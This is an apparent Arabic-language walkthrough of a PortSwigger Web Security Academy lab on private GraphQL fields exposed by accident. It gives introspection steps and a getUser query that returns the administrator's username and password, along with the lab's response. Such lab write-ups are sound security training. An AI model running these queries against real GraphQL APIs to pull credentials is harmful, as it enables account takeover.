# Lab : Accidental exposure of private GraphQL fields

https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure

- الفكره من الLab ده ان دي ثغره IDOR تانيه بس المرادي برتجع الusernameو الpassword الخاصه بالحسابات تبع الid لكل حساب

```bash
1. GraphQL > Set introspection query

2. GraphQL > Save GraphQL queries to site map >>جاهزه  Query هيظهر كل الصفحات الي كانت موجوده في هيئه 

3. query($id: Int!) {
  getUser(id: $id) {
    id
    username
    password
  }
}

{"id":1}

HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 133

{
  "data": {
    "getUser": {
      "id": 1,
      "username": "administrator",
      "password": "610nw81irqqksmba54ih"
    }
  }
}
```
